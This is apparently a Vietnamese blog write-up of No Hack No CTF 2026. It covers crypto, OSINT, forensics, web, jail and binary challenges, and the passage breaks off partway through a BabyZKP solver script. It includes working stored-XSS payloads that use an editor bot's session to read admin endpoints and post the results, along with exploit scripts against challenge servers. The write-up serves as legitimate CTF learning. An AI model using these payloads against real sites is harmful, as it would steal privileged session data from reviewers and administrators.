---
title: "Write-up No Hack No CTF 2026"
date: 2026-07-07 14:11:00 +0700
categories: [Capture Flag, Write-up No Hack No CTF 2026]
tags: [ctf, wu, crypto, osint]
math: true
image:
  path: /assets/img/posts/no-hack-no-ctf-2026/no-hack-no-ctf-2026-cover.jpg
  alt: No Hack No CTF 2026
---

Đang trong thời gian nghỉ hè nên là mình có đánh giải No Hack No CTF 2026 cùng với một người bạn nữa để giải trí và học hỏi thêm thì dưới đây là write up các bài mình đã giải được.

## newbie-crypto
![alt text](/assets/img/posts/no-hack-no-ctf-2026/no-hack-no-ctf-1.png)

```python
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import json


KEY = get_random_bytes(16)
NONCE = b"ticket42"
FLAG = "NHNC{REDACTED}"

ATTENDEES = [
    ("hsuan0223x", "H-0223"),
    ("NHNC", "T-0704"),
    (
        "this_chal_not_need_read_read_read_read_read_read_read_read_read_read_read",
        "N-0705",
    ),
    ("AI_WILL_SLOP", "C-114514"),
]


def encode_ticket(ticket):
    return json.dumps(ticket, separators=(",", ":")).encode()


def make_guest_ticket(name, seat):
    return encode_ticket(
        {
            "event": "modern-crypto-101",
            "role": "guest",
            "name": name,
            "seat": seat,
            "note": "enjoy the workshop",
        }
    )


def make_admin_ticket():
    return encode_ticket(
        {
            "event": "modern-crypto-101",
            "role": "admin",
            "name": "organizer",
            "seat": "ROOT",
            "note": "priority access granted",
            "flag": FLAG,
        }
    )


def encrypt(ticket):
    cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE)
    return cipher.encrypt(ticket).hex()


def main():
    for index, (name, seat) in enumerate(ATTENDEES):
        print(f"guest_cipher_{index} = {encrypt(make_guest_ticket(name, seat))}")
    print(f"admin_cipher = {encrypt(make_admin_ticket())}")


if __name__ == "__main__":
    main()
```

Đầu tiên nhìn vào source chall.py thì ta thấy challenge dùng AES ở mode CTR:

```python
def encrypt(ticket):
    cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE)
    return cipher.encrypt(ticket).hex()
```
AES-CTR hoạt động giống stream cipher, tức là nó tạo ra một dòng byte gọi là keystream, sau đó XOR với plaintext để tạo ciphertext:
```
ciphertext = plaintext XOR keystream
```
Vì XOR có tính chất đảo ngược, nên khi giải mã ta chỉ cần XOR ciphertext lại với cùng keystream:
```
plaintext = ciphertext XOR keystream
```
Nói cách khác, nếu biết 2 trong 3 giá trị plaintext, ciphertext, keystream thì ta có thể tính được giá trị còn lại.

Tiếp theo nhìn vào hàm encrypt thì thấy mỗi lần mã hóa đều tạo AES-CTR với cùng KEY và cùng NONCE:
```python
KEY = get_random_bytes(16)
NONCE = b"ticket42"
```
=> Trong AES-CTR nếu dùng lại cùng KEY và cùng NONCE thì keystream sinh ra sẽ giống hệt nhau.

Tức là các ticket trong bài đều được mã hóa theo dạng:
```
guest_cipher = guest_plaintext XOR keystream
admin_cipher = admin_plaintext XOR keystream
```
Tói đây thì ta có thể dựng lại plaintext của các guest ticket vì trong source có hàm tạo guest ticket:
```python 
def make_guest_ticket(name, seat):
    return encode_ticket(
        {
            "event": "modern-crypto-101",
            "role": "guest",
            "name": name,
            "seat": seat,
            "note": "enjoy the workshop",
        }
    )
```
Còn name và seat của guest thì nằm trong public.txt:
```
name,seat
hsuan0223x,H-0223
NHNC,T-0704
this_chal_not_need_read_read_read_read_read_read_read_read_read_read_read,N-0705
AI_WILL_SLOP,C-114514
```
Do đó ta có thể tự dựng lại plaintext của guest. Ta chọn guest_cipher_2 vì guest này có phần name rất dài, nên plaintext của nó cũng dài. Nhờ vậy ta lấy được keystream đủ dài để giải toàn bộ admin ticket.

Sau khi có keystream, ta giải admin rồi lấy Flag.

```python
import re
import json
from pathlib import Path

out = Path("dist/output.txt").read_text()

cts = {
    m.group(1): bytes.fromhex(m.group(2))
    for m in re.finditer(r"(guest_cipher_\d+|admin_cipher) = ([0-9a-f]+)", out)
}

name = "this_chal_not_need_read_read_read_read_read_read_read_read_read_read_read"
seat = "N-0705"

guest_plaintext = json.dumps({
    "event": "modern-crypto-101",
    "role": "guest",
    "name": name,
    "seat": seat,
    "note": "enjoy the workshop",
}, separators=(",", ":")).encode()

guest_cipher = cts["guest_cipher_2"]
admin_cipher = cts["admin_cipher"]

keystream = bytes(c ^ p for c, p in zip(guest_cipher, guest_plaintext))

admin_plaintext = bytes(c ^ k for c, k in zip(admin_cipher, keystream))

print(admin_plaintext.decode())
```

=> Flag: ```NHNC{c7r_k3y57r34m5_5h0uld_n3v3r_r37urn}```

## Final Boarding
![alt text](/assets/img/posts/no-hack-no-ctf-2026/no-hack-no-ctf-2.png)

Đầu tiên thì bài này là một bài osint, mình phải tìm được 2 thứ là:

- Ngày ảnh được chụp
- IATA flight number của chuyến bay

### Date the photo 
Đầu tiên thì trong đề có ghi là "That day in Japan marked the end of Golden Week" thì đây là một ngày tuần lễ vàng người dân Japan được nghỉ để nghĩ dưỡng các thứ. Ngày này rơi vào cuối tháng 4 đến đầu tháng 5. 

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Final-Boarding-1.png)

Nhưng trong bài này khả năng cao là đầu tháng 5 vì nó ghi là "End of Golden Week".

Để biết chính xác thì mình xem metadata của tấm hình đề cho 

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Final-Boarding-2.png)

Ta thấy +09:00 là múi giờ Nhật Bản, nên thời gian này là giờ địa phương tại Nhật và thời gian này cũng khớp so với thời gian Golden Week thực tế.

=> 2026-05-05

### IATA flight number 

Nhìn vào tấm hình thì có thể thấy đuôi máy bay là của hãng Jetstar Japan số hiệu A320 và bên cạnh đó là registration của aircraft là JA06JJ.

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Final-Boarding-3.png)

Đề nói người chụp đang đứng trước boarding gate tại Nhật mà ở Nhật có hơn khoảng 55 sân bay nên đầu tiên phải xác định được sân bay nằm ở ga nào thì với các thông tin như mã số, loại máy bay thì mình search được lịch bay của chiếc máy bay này. 

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Final-Boarding-4.png)

Nhìn vào bảng thì mình thấy cái khớp nhất là GK55 vì 14:49 JST tức khoảng 40 phút trước khi bay thì người này đã đứng chụp tấm ảnh này. 

=> GK55

=> Flag: ```NHNC{20260505_GK55}```

## Kira-Notes

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Kira-Notes-1.png)

Đề bài cho một file .sqlite là SQLite database lưu lịch sử duyệt của Firefox. Đầu tiên mình xem thử gồm những bảng nào trong database.

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Kira-Notes-2.png)

Rồi sau đó xem lại lịch sử truy cập, trong đống này thì có dòng drive có tên của chall nên tải xuống thử.

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Kira-Notes-3.png)

Sau khi vào drive và tải xuống thì drive bao gồm 3 file. Trong đó:
- Some Backup 01.png chỉ là ảnh chụp giao diện Kira Notes.

- noth_____.png là ảnh một mảnh giấy chứa một phần password.

- of.img là một disk image nên nhiều khả năng chứa dữ liệu quan trọng nhất.

Tới đây mình đi tiếp file of.img, mình xem bảng phân vùng 

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Kira-Notes-4.png)

Ta thấy phân vùng Linux bắt đầu tại sector 2048. Mỗi sector có kích thước 512 bytes, do đó offset của phân vùng là: 2048 * 512 = 1048576 bytes.

Để dễ việc thao tác thì ở đây mình cắt phần gpt header phía trước chỉ giữ lại filesystem.

```python
dd if=of.img of=of-part.ext4 bs=512 skip=2048
```
- if=of.img: file đầu vào.
- of=of-part.ext4: file đầu ra.
- bs=512: đọc theo từng block 512 bytes (1 sector).
- skip=2048: bỏ qua 2048 sector đầu tiên để bắt đầu từ vị trí của phân vùng Linux.

Tiếp theo là phần tích filesystem, mình thử vào và tìm có flag hay hint gì không thì thấy trong ```/home/ctf/Downloads``` ghi là 

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Kira-Notes-5.png)

Điều này cho thấy file cần tìm đã bị xóa khỏi filesystem, vì vậy không thể lấy bằng cách duyệt thư mục thông thường mà phải tiến hành carve dữ liệu. Vì nếu file đó được xóa mà không bị ghi đè thì về cơ bản vẫn có thể carve lại được.

Đầu tiên mình tìm các magic bytes phổ biến của những định dạng có thể xuất hiện trong image:

```python
data = open("of-part.ext4", "rb").read()

sigs = {
    "ZIP": b"PK\x03\x04",
    "PNG": b"\x89PNG\r\n\x1a\n",
    "PDF": b"%PDF"
}

for name, sig in sigs.items():
    pos = 0
    while True:
        pos = data.find(sig, pos)
        if pos == -1:
            break
        print(f"{name}: {pos}")
        pos += 1
```

```
ZIP: 277349376
PNG: 277350400
PNG: 520094720
PDF: 521143296
```

Như vậy trong filesystem vẫn còn dấu vết của một file ZIP, hai file PNG và một file PDF. Vì trước đó có ảnh gợi ý password nên mình ưu tiên carve các file PNG trước để kiểm tra nội dung.

Với PNG phần đầu file bắt đầu bằng signature \x89PNG\r\n\x1a\n, còn phần cuối kết thúc bằng chunk IEND, còn offset thì mình thử 1 trong 2 cái đó thôi:

```python
data = open("of-part.ext4", "rb").read()

start = 277350400

end = data.find(b"IEND\xae\x42\x60\x82", start)
end += 8

open("carved.png", "wb").write(data[start:end])
```

Sau đó chúng ta sẽ đọc được password

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Kira-Notes-6.png)

=> password: ```0x0kira1337```

Sau khi có password từ ảnh PNG, mình tiếp tục carve file ZIP. Tương tự 

```python
data = open("of-part.ext4", "rb").read() 

start = 277349376 

eocd = data.find(b"PK\x05\x06", start) 
comment_len = int.from_bytes(data[eocd+20:eocd+22], "little") 
end = eocd + 22 + comment_len 

open("final.zip", "wb").write(data[start:end])
```

Với password là ```0x0kira1337```

Flag: ```NHNC{n0w_y0u_kn0w_h0w_t0_f0r3ns1c_0x00000Easyyyyyyyyy}```

Bên cạnh đó thì nãy còn 1 file PDF nữa nên mình carve rồi xem có gì luôn, thì thấy tâm thư của Kira =)))

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Kira-Notes-7.png)

## LemonShelf

![alt text](/assets/img/posts/no-hack-no-ctf-2026/LemonShelf-1.png)

Sau khi tạo tài khoản và login vào thì thấy, LemonShelf là một nền tảng submit và review tiểu thuyết và User có thể submit bài viết. Mình đoán bài này là dạng có thể chèn JavaScript vào bài viết, khi editor mở bài để review thì script sẽ chạy bằng session của editor/admin. Vì vậy hướng khai thác ban đầu là tìm stored XSS trong phần submit bài.

![alt text](/assets/img/posts/no-hack-no-ctf-2026/LemonShelf-2.png)

![alt text](/assets/img/posts/no-hack-no-ctf-2026/LemonShelf-3.png)

Mình thử test thì ở đây nó có Stored XSS ở Author Note thật nên là tới đây mình thay bằng payload exploit.

```php
<script>
(async () => {
  let id = location.pathname.match(/\d+/)[0];

  let r = await fetch('/api/me', {
    credentials: 'include'
  });

  let t = await r.text();

  await fetch('/api/books/' + id + '/comments', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({content: t})
  });
})();
</script>
```

Mình check frontend sử dụng endpoint ```/api/me``` nên là mình thử leak xem là payload có thực sự chạy bằng quyền của editor hay không. 

![alt text](/assets/img/posts/no-hack-no-ctf-2026/LemonShelf-4.png)

Tới đây thì nó chỉ ra được siteConfig nằm ở ```/api/editor/config``` nên tiếp theo là lấy nội dung của endpoint này.

```php
<script>
(async () => {
  let id = location.pathname.match(/\d+/)[0];

  let r = await fetch('/api/editor/config', {
    credentials: 'include'
  });

  let t = await r.text();

  await fetch('/api/books/' + id + '/comments', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: t
    })
  });
})();
</script>
```

Đợi cho bot reviews thì nó leak luôn cái endpoint của flag 
![alt text](/assets/img/posts/no-hack-no-ctf-2026/LemonShelf-5.png)

Tới đây thì chỉ cần việc là tương tự gửi XSS Stored vào endpoint đó rồi lấy flag.

```php
<script>
(async () => {
  let id = location.pathname.match(/\d+/)[0];

  let r = await fetch('/api/admin/flag', {
    credentials: 'include'
  });

  let t = await r.text();

  await fetch('/api/books/' + id + '/comments', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({content: 'FLAG: ' + t})
  });
})();
</script>
```
![alt text](/assets/img/posts/no-hack-no-ctf-2026/LemonShelf-6.png)

Flag: ```NHNC{T3AG0D_1S_13GAND}```


## Camel rider

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Camel-rider-1.png)

Bài này thì có hint khá rõ là Jail rồi nên là đầu tiên khi netcat vào thì thấy giao diện như thế này 
![alt text](/assets/img/posts/no-hack-no-ctf-2026/Camel-rider-2.png)

Mình thử test ```print 1+1``` thì nó in ra 2 thì gần như chắc đây là Perl eval jail rồi.

Tiếp tục mình thử các lệnh như ```print "hi"```, ```open F,"flag.txt";print <F>``` thì server đều trả về Meow
![alt text](/assets/img/posts/no-hack-no-ctf-2026/Camel-rider-3.png)

Thì suy ra được filter đang chặn loại: dấu nháy, chữ open. Mình tiếp tục thử thì trong Perl có q(...), tương đương string literal thì thấy nó in ra bình thường.


![alt text](/assets/img/posts/no-hack-no-ctf-2026/Camel-rider-4.png)

Vậy ta tạo được chuỗi flag.txt mà không cần "flag.txt". Tới đây thì rõ rồi mình dùng toán tử diamond <> sẽ đọc file từ danh sách @ARGV.

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Camel-rider-5.png)

Flag: ```NHNC{Bf8fnibf2fhiqfwbqubXmoyt4191qv3rx}```

## Homework

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Homework-1.png)

```C++
if ( (unsigned __int8)sub_2D980(&v127) )
  {
    sub_27D10(v101, v121, v120, &v180);
    sub_2A0E0(v183, &v127, v119);
    sub_2AC00(&v163, v183, v159[0].m128i_i64[0], (v159[0].m128i_i64[1] - v159[0].m128i_i64[0]) >> 8);
    sub_26D80(&v183[1]);
    v72 = sub_98CB0(&qword_202F60, "n = ");
    v73 = sub_99150(v72, v119);
    sub_98CB0(v73, "\n");
    v74 = sub_98CB0(&qword_202F60, "a_plus_d = ");
    v186 = 0x1C00000000LL;
    v75 = *v48;
    memset(v183, 0, sizeof(v183));
    v185 = 0;
    v184 = 0;
    sub_28300(v183, v75);
    sub_28300(v183, &v48[3][8]);
    v76 = sub_302D0(v74, v183);
    sub_98CB0(v76, "\n");
    v77 = sub_98CB0(&qword_202F60, "bc = ");
    v78 = *v48;
    v79 = v48[3];
    v80 = (*v48)[15].m128i_i32[0];
    v183[0] = _mm_loadu_si128(*v48 + 8);
    v81 = _mm_loadu_si128(v78 + 9);
    v184 = v80;
    LOBYTE(v80) = v78[15].m128i_i8[4];
    v183[1] = v81;
    v82 = _mm_loadu_si128(v78 + 10);
    v185 = v80;
    v183[2] = v82;
    v183[3] = _mm_loadu_si128(v78 + 11);
    v183[4] = _mm_loadu_si128(v78 + 12);
    v183[5] = _mm_loadu_si128(v78 + 13);
    v83 = _mm_loadu_si128(v78 + 14);
    v84 = v78[15].m128i_u64[1];
    v183[6] = v83;
    v186 = v84;
    v85 = (const __m128i *)sub_291D0(v183, v79);
    v86 = v85[7].m128i_i32[0];
    v170 = _mm_loadu_si128(v85);
    v87 = _mm_loadu_si128(v85 + 1);
    v177 = v86;
    LOBYTE(v86) = v85[7].m128i_i8[4];
    v171 = v87;
    v88 = _mm_loadu_si128(v85 + 2);
    v178 = v86;
    v172 = v88;
    v173 = _mm_loadu_si128(v85 + 3);
    v174 = _mm_loadu_si128(v85 + 4);
    v175 = _mm_loadu_si128(v85 + 5);
    v89 = _mm_loadu_si128(v85 + 6);
    v90 = v85[7].m128i_i64[1];
    v176 = v89;
    v179 = v90;
    v91 = sub_302D0(v77, &v170);
    sub_98CB0(v91, "\n");
    sub_98CB0(&qword_202F60, "C = ");
    sub_262D0(v163.m128i_i64[0], (v163.m128i_i64[1] - v163.m128i_i64[0]) >> 8);
    sub_98CB0(&qword_202F60, "T: ");
    sub_21000(v183, 128);
    if ( v183[0].m128i_i64[1] != v121
      || v183[0].m128i_i64[1] && (unsigned int)j_ifunc_11CDD0(v183[0].m128i_i64[0], v120) )
    {
      sub_98CB0(&qword_202F60, "no\n");
    }
    else
    {
      v97 = sub_98800(&qword_202F60, v122[0], v122[1]);
      sub_98CB0(v97, "\n");
    }
    sub_26A20(v183);
    sub_26DF0(&v163);
    sub_26DF0(v101);
  }
  else
  {
    sub_98CB0(&qword_202F60, "calculation failed\n");
  }
```
Tổng quan phase đầu, chall yêu cầu nhập hai ma trận X và Y, format nhập gồm kích thước của X, Y, dữ liệu của X, Y và cuối cùng là op. Sau khi nhận input chương trình gọi hàm xử lý phép toán giữa X và Y rồi đưa kết quả vào một hàm kiểm tra.

Nếu check thất bại, chương trình dừng lại với thông báo calculation failed. Nếu check thành công, chall chuyển sang phase hai.

Flow cơ bản là như vậy nên là bây giờ mình sẽ đi từng bước. Đầu tiên là pass phrase 1

```C++
sub_98800(&qword_202F60, "op: ", 4);
sub_21000(&v32, 128);        // đọc op

if (v36 == 5 && *(_DWORD *)v35 == 1852140642 && *((_BYTE *)v35 + 4) == 100)
{
    v38[0] = 0;
    v10 = sub_7D850(&v42, v38);   // đọc shift

    if (stream_error)
        panic("missing shift");

    sub_237A0(v28, v27, v38[0], v29);
}
```
Đoạn này cho thấy op được đọc từ input. Nếu op là "blend" thì chương trình đọc thêm một số shift, rồi gọi sub_237A0. Vì vậy input cuối phải có dạng: ```blend <shift>```

```C++
if (*(_QWORD *)a1 != 1 || *(_QWORD *)(a1 + 8) != 1)
    fail;

if (*(_QWORD *)a2 != 1 || *(_QWORD *)(a2 + 8) != 1)
    fail;

if (a4 < a3)
    fail;
```

Nhưng trong hàm sub_237A0 thì đoạn này bắt buộc cả hai ma trận phải là ```1x1```. Ở đây a3 là shift mình nhập, a4 là layout_shift chương trình tính được. Debug in: ```use shift = 3``` nên nhập shift = 3 sẽ không fail.

```C++
v4 = **(const __m128i ***)(a1 + 16);
...
v28 = (__m128i *)&v4[8 * a3];
```
Vì Real = 128 byte = 8 * __m128i, nên v4[8 * shift] chính là: ```Y[shift]```

Nhưng Y chỉ là ma trận 1x1, chỉ có Y[0]. Với shift = 3, chương trình ghi ra ngoài Y. Sau đó nó ghi kết quả vào v28:
```C++
*v28 = ...
v28[1] = ...
...
v28[7] = ...
```
Tức là ghi nguyên một Real vào địa chỉ Y[3]. Debug trước đó đã nói:```Y[3] == A[0][1]``` nên blend 3 sẽ ghi đè A[0][1].

Payload vì vậy là:

```
1 1
1 1
0
1e90
blend 3
```

```C++
sub_25C40(...);              // xử lý op
if ((unsigned __int8)sub_2D980(&v127))
{
    sub_27D10(...);
    sub_2A0E0(v183, &v127, v119);
    sub_2AC00(&v163, v183, ...);

    print("n = ");
    print(v119);

    print("a_plus_d = ");
    sub_28300(v183, v75);
    sub_28300(v183, &v48[3][8]);
    print(v183);

    print("bc = ");
    v85 = sub_291D0(v183, v79);
    print(v85);

    print("C = ");
    sub_262D0(...);

    print("T: ");
    sub_21000(v183, 128);

    if (T != expected)
        print("no");
    else
        print(flag);
}
else
{
    print("calculation failed");
}
```


Sau khi pass được phrase 1 thì nó sẽ trả về các tham số n, a_plus_d, bc, C.Đây là dấu hiệu cho thấy phần sau là một bài toán ma trận tuyến tính. Với payload ở phase 1, ta đã control được ```A[0][1]```, lúc này ma trận có dạng:

$$
A = \begin{bmatrix}
a & b \\
c & 0
\end{bmatrix}
$$

Trong đó:

-   $a$ = a_plus_d

- $b = 1e90$

- $c = bc / b$

Vì chương trình leak bc, còn b là giá trị mình đã ghi vào ```A[0][1]```, nên ta suy ra:
$
c = \frac{bc}{b}
$

C là danh sách các vector kết quả sau khi chương trình lấy dữ liệu gốc rồi nhân với ma trận A lặp n lần:
$$
C_i = original_i \times A^n
$$

Do đó muốn khôi phục lại dữ liệu ban đầu, ta chỉ cần nhân ngược với ma trận nghịch đảo:
$$
original_i = C_i \times (A^n)^{-1}
$$

Gọi:
$$
M = A^n =
\begin{bmatrix}
p & q \\
r & s
\end{bmatrix}
$$

Khi đó:
$
det = p \times s - q \times r
$

và:
$$
M^{-1} =
\frac{1}{det}
\begin{bmatrix}
s & -q \\
-r & p
\end{bmatrix}
$$

Từ mỗi vector trong C, ta nhân với $M^{-1}$ để recover lại ký tự tương ứng của chuỗi T, sau đó gửi T cho chương trình để lấy flag.

```python
from pwn import *
from decimal import Decimal, ROUND_HALF_EVEN, getcontext
import re
import sys

getcontext().prec = 500
getcontext().Emax = 999999999
getcontext().Emin = -999999999

HOST = "160.30.99.158"
PORT = 30014

def mul(a, b):
    return [
        [a[0][0] * b[0][0] + a[0][1] * b[1][0], a[0][0] * b[0][1] + a[0][1] * b[1][1]],
        [a[1][0] * b[0][0] + a[1][1] * b[1][0], a[1][0] * b[0][1] + a[1][1] * b[1][1]],
    ]


def mpow(a, n):
    res = [[Decimal(1), Decimal(0)], [Decimal(0), Decimal(1)]]
    while n:
        if n & 1:
            res = mul(res, a)
        a = mul(a, a)
        n >>= 1
    return res


def solve_t(out):
    n = int(re.search(r"n = (\d+)", out).group(1))
    a = Decimal(re.search(r"a_plus_d = ([^\n]+)", out).group(1))
    bc = Decimal(re.search(r"bc = ([^\n]+)", out).group(1))
    pairs = re.findall(r"\(([-+0-9.eE]+),([-+0-9.eE]+)\)", re.search(r"C = \[(.*)\]\s*T:", out, re.S).group(1))

    b = Decimal("1e90")
    m = mpow([[a, b], [bc / b, Decimal(0)]], n)
    p, q = m[0]
    r, s = m[1]
    det = p * s - q * r

    ans = ""
    for x, y in pairs:
        ch = (s * Decimal(x) - q * Decimal(y)) / det
        ans += chr(int(ch.to_integral_value(rounding=ROUND_HALF_EVEN)))
    return ans


for _ in range(30):
    try:
        io = remote(HOST, PORT)
        io.sendlineafter(b"X size:", b"1 1")
        io.sendlineafter(b"Y size:", b"1 1")
        io.sendlineafter(b"X data:", b"0")
        io.sendlineafter(b"Y data:", b"1e90")
        io.sendlineafter(b"op:", b"blend 3")

        out = io.recvuntil(b"T:", timeout=15).decode("latin1", "replace")
        t = solve_t(out)
        if not all(32 <= ord(c) <= 126 for c in t):
            raise ValueError(repr(t))

        log.success(f"T = {t!r}")
        io.sendline(t.encode())
        print(io.recvall(timeout=5).decode("latin1", "replace"))
        break
    except Exception as e:
        log.warning(f"retry: {e}")
        try:
            io.close()
        except Exception:
            pass
```

![alt text](/assets/img/posts/no-hack-no-ctf-2026/Homework-2.png)

Flag: ```NHNC{y0u_c4nt_di4g0n4l1z3_y0ur_w4y_0ut_0f_h0m3w0rk_39af750725c9441891a44294a576e547}```
## BabyZKP

![alt text](/assets/img/posts/no-hack-no-ctf-2026/BabyZKP-1.png)

```python
# chall.py
from Crypto.Util.number import getPrime
from rng import GetRandBits, TLCG
from secret import flag

ORACLE_LIMIT = 0x1337
G = 2

def run_stage(stage, rng, p, oracle_count):
    pp = getPrime(1024)
    q = p - 1
    print(f"{p=}")
    if isinstance(rng, TLCG):
        print(f"A={rng.A}")
        print(f"C={rng.C}")

    w = rng.next()
    y = pow(G, w, p)
    while oracle_count < ORACLE_LIMIT:
        oracle_count += 1
        print(f"Stage {stage}")
        print(f"BabyZKP Round: {hex(oracle_count)}")
        r = rng.next()
        a = pow(G, r, p)
        print(f"{a=}")
        e = int(input("e="))
        if e.bit_length() < 1023 or e > q - 1 or e < 0:
            print("bad hacker")
            exit()
        z = (r + e * w) % pp
        print(f"{z=}")
        status = input("verifier accept? (Y/N)")
        if status == "Y":
            break
    else:
        print("failed")
        exit()

    inp_w = int(input("w="))
    if inp_w != w:
        print("failed")
        exit()
    return oracle_count

cnt = 0
p1 = getPrime(1024)
cnt = run_stage(1, TLCG(p1), p1, cnt)
cnt = run_stage(2, GetRandBits(), getPrime(1024), cnt)
print(flag)
```

Đầu tiên thì server có 2 stage và mỗi stage làm gần giống như Schnorr protocol:

```
w = rng.next()
y = pow(2, w, p)

r = rng.next()
a = pow(2, r, p)
e = input()
z = (r + e * w) % pp
```

![alt text](/assets/img/posts/no-hack-no-ctf-2026/BabyZKP-2.png)

Một cái Schnorr chuẩn thì nó sẽ là:
- w là secret.
- $y = g^w$ mod $p$ là public key.
- r là nonce/random.
- $a = g^r$ mod $p$ là commitment.
- verifier gửi challenge e.
- prover trả $z = r + e*w$.
- verifier kiểm tra kiểu $g^z == a * y^e$.

Nhưng ở chall này thì nó hơi khác một chút là: 
1. Server không nhả ra $y$.
2. Server không tự verify mà lại hỏi người dùng
3. z được tính modulo pp, mà pp là prime 1024-bit secret, không liên quan tới group order $p - 1$
4. Sau khi verify từ người dùng thì server chỉ hỏi lại đúng secret w.

Ý tưởng ở stage này là dùng oracle $(a, z)$ để khôi phục secret w sinh ra từ RNG.

```python
# rng.py
from Crypto.Util.number import getRandomRange
from random import getrandbits


class TLCG:
    MASK_BITS = 512
    MASK = (1 << MASK_BITS) - 1

    def __init__(self, p):
        self.p = p
        self.A = getRandomRange(2, p - 1)
        self.C = getRandomRange(1, p - 1)
        self.x = getRandomRange(0, p)

    def next(self):
        self.x = (self.A * self.x + self.C) % self.p
        return self.x & self.MASK


class GetRandBits:
    def __init__(self, bits=1024):
        self.bits = bits

    def next(self):
        return getrandbits(self.bits)
```

Thì ở đây cũng có 2 class đầu tiên 

Stage 1: TLCG


$$x_{i+1} = A*x_i + C \pmod p$$


Nhưng mỗi lần output, nó chỉ trả về 512 bit thấp của state: $r_i = x_i \pmod 2^{512}$


Trong stage 1, server in ra `p`, `A`, `C`, nên ta biết đầy đủ tham số của  LCG. Điểm còn thiếu chỉ là phần bit cao bị khuyết.

Stage 2: GetRandBits

```python
class GetRandBits:
    def __init__(self, bits=1024):
        self.bits = bits

    def next(self):
        return getrandbits(self.bits)
```

Đây là wrapper của Python `random.getrandbits(1024)`. Python `random` dùng MT19937. Mỗi lần gọi `getrandbits(1024)`, MT19937 sinh 32 word 32-bit.

Sau khi biết cả hai stage đều phụ thuộc vào RNG, việc còn lại là recover lại w.
Ở stage 1, mình gửi cùng một giá trị:
$
e = 2^{1022}
$ cho nhiều oracle round. Khi đó:
$
z_i = r_i + e*w \pmod {pp}
$

Lấy hiệu hai round thì phần e*w bị triệt tiêu:
$
z_i - z_0 = r_i - r_0
$

Do $r_i$ chỉ là 512 bit thấp của state LCG, đặt:
$
x_i = r_i + 2^{512}h_i
$

Rồi dùng quan hệ:
$
x_{i+1} = A*x_i + C \pmod p
$
để dựng lattice recover phần cao $h_i$. Sau khi có full state $x_0$, lùi LCG một bước để lấy secret:
```python
prev = (x0 - C) * inverse(A, p) % p
w = prev & ((1 << 512) - 1)
```
Submit w là qua stage 1.

Stage 2, ta lợi dụng:
$
a = 2^r \pmod p
$

$
a = 2^r \pmod p
$

Nếu:
$
ord_p(2) = 2^s*h
$


thì:
$
a^h = (2^h)^r
$
nên brute force trong subgroup nhỏ để lấy: $r \mod 2^s$

Reconnect đến khi s >= 5, lúc này mỗi oracle round leak được 5 bit thấp của output MT19937. Vì getrandbits(1024) dùng 32 word 32-bit, các leak nằm ở vị trí:
32, 64, 96, ... Collect khoảng 3988 round, dựng hệ tuyến tính GF(2) để recover state MT19937, rồi sinh lại output 1024-bit đầu tiên để lấy w.

```python
from pwn import *
from Crypto.Util.number import inverse
from flint import fmpz_mat
from mt_lowbit_recover import LowBitMTRecover, first_getrandbits_1024_from_prestate
from decimal import Decimal, ROUND_HALF_EVEN, getcontext
import re, time

HOST, PORT = "chal.whale-tw.com", 51337
B = 1 << 512
E = 1 << 1022
N = 3988
LBITS = 5

def parse(s, name):
    return int(re.search(rf"{name}=([0-9]+)", s).group(1))

def babai(M, target):
    getcontext().prec = 1400
    Bm = [[int(x) for x in row] for row in M]
    gs, norm = [], []

    def dot(a, b):
        return sum(Decimal(x) * Decimal(y) for x, y in zip(a, b))

    for i, row in enumerate(Bm):
        v = list(map(Decimal, row))
        for j in range(i):
            mu = dot(row, gs[j]) / norm[j]
            v = [v[k] - mu * gs[j][k] for k in range(len(v))]
        gs.append(v)
        norm.append(dot(v, v))

    y = list(map(Decimal, target))
    for i in range(len(Bm) - 1, -1, -1):
        c = sum(y[k] * gs[i][k] for k in range(len(y))) / norm[i]
        c = int(c.to_integral_value(rounding=ROUND_HALF_EVEN))
        y = [y[k] - c * Bm[i][k] for k in range(len(y))]

    return [int(Decimal(target[i]) - y[i]) for i in range(len(target))]

def solve_lcg(p, A, C, zs):
    ds = [z - zs[0] for z in zs]
    invB = inverse(B, p)

    coeff = []
    Ap, Cs = 1, 0
    for i in range(1, len(zs)):
        Cs = (A * Cs + C) % p
        Ap = (Ap * A) % p
        coeff.append((Ap, ((Ap - 1) * invB) % p, ((Cs - ds[i]) * invB) % p))

    m = len(coeff)
    rows = []

    r = [0] * (m + 2)
    r[0] = 1
    for i, (a, _, _) in enumerate(coeff):
        r[i + 2] = a
    rows.append(r)

    r = [0] * (m + 2)
    r[1] = 1
    for i, (_, b, _) in enumerate(coeff):
        r[i + 2] = b
    rows.append(r)

    for i in range(m):
        r = [0] * (m + 2)
        r[i + 2] = -p
        rows.append(r)

    center = 1 << 511
    target = [center, center] + [-c + center for _, _, c in coeff]

    v = babai(fmpz_mat(rows).lll().tolist(), target)
    h0, R = v[0], v[1]
    x0 = R + B * h0

    return (((x0 - C) * inverse(A, p)) % p) & (B - 1)

def pass_stage1(io):
    s = io.recvuntil(b"e=").decode()
    p, A, C = parse(s, "p"), parse(s, "A"), parse(s, "C")

    rounds = 14
    io.send(((str(E) + "\nN\n") * (rounds - 1) + str(E) + "\n").encode())

    while s.count("verifier accept? (Y/N)") < rounds:
        s += io.recv(1 << 20).decode(errors="ignore")

    zs = list(map(int, re.findall(r"z=([0-9]+)", s)))
    w = solve_lcg(p, A, C, zs[:rounds])

    io.sendline(b"Y")
    io.recvuntil(b"w=")
    io.sendline(str(w).encode())

